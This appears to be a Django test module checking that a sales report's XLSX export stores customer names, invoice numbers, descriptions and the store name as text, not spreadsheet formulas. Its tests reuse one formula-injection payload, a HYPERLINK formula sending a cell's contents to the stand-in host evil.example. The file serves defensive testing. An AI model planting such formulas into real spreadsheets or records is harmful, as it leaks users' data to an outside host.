"""The sales report XLSX writes record text as text, never as a formula (DjangoLux F3)."""
from decimal import Decimal
from io import BytesIO
from unittest import mock

from django.test import SimpleTestCase, TestCase
from django.utils import timezone

from openpyxl import Workbook, load_workbook

from catalog.models import Product, Service, StockMovement
from sales.models import Invoice, InvoiceItem
from sales.reports import build_sales_report, build_sales_report_xlsx
from sales.services import issue_invoice

FORMULA = '=HYPERLINK("http://evil.example/?x="&A1,"open")'


def _cells(content, sheet):
    return {cell.coordinate: cell for row in load_workbook(BytesIO(content))[sheet].iter_rows() for cell in row}


def _report(**overrides):
    today = timezone.localdate()
    report = {
        "date_from": today,
        "date_to": today,
        "total_sales": Decimal("100.00"),
        "total_paid": Decimal("40.00"),
        "outstanding": Decimal("60.00"),
        "invoice_count": 1,
        "by_status": [{"status_label": "Issued", "count": 1, "total": Decimal("100.00")}],
        "daily": [{"invoice_date": today, "count": 1, "total": Decimal("100.00")}],
        "by_product": [{"description": "Lock X1", "qty": Decimal("1"), "total": Decimal("100.00")}],
        "by_service": [{"description": "Fitting", "qty": Decimal("1"), "total": Decimal("50.00")}],
        "invoices": [
            {
                "number": "INV-000001",
                "invoice_date": today,
                "customer_name": "Acme",
                "status_label": "Issued",
                "total_lyd": Decimal("100.00"),
                "amount_paid": Decimal("40.00"),
                "balance": Decimal("60.00"),
            }
        ],
    }
    report.update(overrides)
    return report


class SalesReportXlsxIsTextSafeTests(SimpleTestCase):
    def test_a_plain_append_of_the_payload_is_a_formula(self):
        """Why the guard exists: openpyxl turns any leading '=' into a formula."""
        wb = Workbook()
        wb.active.append([FORMULA])
        reloaded = load_workbook(_save(wb))
        self.assertEqual(reloaded.active["A1"].data_type, "f")

    def test_customer_name_is_a_text_cell(self):
        report = _report()
        report["invoices"][0]["customer_name"] = FORMULA
        cell = _cells(build_sales_report_xlsx(report), "Invoices")["C2"]
        self.assertEqual(cell.data_type, "s")
        self.assertEqual(cell.value, FORMULA)

    def test_invoice_number_is_a_text_cell(self):
        report = _report()
        report["invoices"][0]["number"] = FORMULA
        cell = _cells(build_sales_report_xlsx(report), "Invoices")["A2"]
        self.assertEqual(cell.data_type, "s")
        self.assertEqual(cell.value, FORMULA)

    def test_product_description_is_a_text_cell(self):
        report = _report(by_product=[{"description": FORMULA, "qty": Decimal("1"), "total": Decimal("5.00")}])
        cell = _cells(build_sales_report_xlsx(report), "Top Products")["A2"]
        self.assertEqual(cell.data_type, "s")
        self.assertEqual(cell.value, FORMULA)

    def test_service_description_is_a_text_cell(self):
        report = _report(by_service=[{"description": FORMULA, "qty": Decimal("1"), "total": Decimal("5.00")}])
        cell = _cells(build_sales_report_xlsx(report), "Top Services")["A2"]
        self.assertEqual(cell.data_type, "s")
        self.assertEqual(cell.value, FORMULA)

    def test_store_name_in_the_title_is_a_text_cell(self):
        with mock.patch("sales.reports.store_name", return_value=FORMULA):
            title = _cells(build_sales_report_xlsx(_report()), "Summary")["A1"]
        self.assertEqual(title.data_type, "s")
        self.assertTrue(title.value.startswith(FORMULA))

    def test_numbers_stay_numbers_and_money_keeps_its_format(self):
        cells = _cells(build_sales_report_xlsx(_report()), "Invoices")
        for coordinate in ("E2", "F2", "G2"):
            with self.subTest(cell=coordinate):
                self.assertEqual(cells[coordinate].data_type, "n")
                self.assertEqual(cells[coordinate].number_format, "#,##0.00")


class SalesReportXlsxFromRealRecordsTests(TestCase):
    def test_hostile_customer_and_line_descriptions_survive_the_real_report(self):
        product = Product.objects.create(name="Lock X1", cost_usd=Decimal("1.00"), price_usd=Decimal("2.00"))
        service = Service.objects.create(name="Fitting")
        StockMovement.objects.create(product=product, movement_type="in", quantity=Decimal("5"))
        invoice = Invoice.objects.create(customer_name=FORMULA)
        InvoiceItem.objects.create(
            invoice=invoice, kind=InvoiceItem.KIND_PRODUCT, product=product, description=FORMULA,
            unit_price_lyd=Decimal("10"), quantity=Decimal("1"),
        )
        InvoiceItem.objects.create(
            invoice=invoice, kind=InvoiceItem.KIND_SERVICE, service=service, description=FORMULA,
            unit_price_lyd=Decimal("5"), quantity=Decimal("1"),
        )
        invoice.recalc_totals()
        issue_invoice(invoice, None)

        today = timezone.localdate()
        content = build_sales_report_xlsx(build_sales_report(today, today))

        for sheet, coordinate in (("Invoices", "C2"), ("Top Products", "A2"), ("Top Services", "A2")):
            with self.subTest(sheet=sheet):
                cell = _cells(content, sheet)[coordinate]
                self.assertEqual(cell.data_type, "s")
                self.assertEqual(cell.value, FORMULA)

        formula_cells = [
            cell.coordinate
            for ws in load_workbook(BytesIO(content)).worksheets
            for row in ws.iter_rows()
            for cell in row
            if cell.data_type == "f"
        ]
        self.assertEqual(formula_cells, [])


def _save(workbook):
    buffer = BytesIO()
    workbook.save(buffer)
    buffer.seek(0)
    return buffer
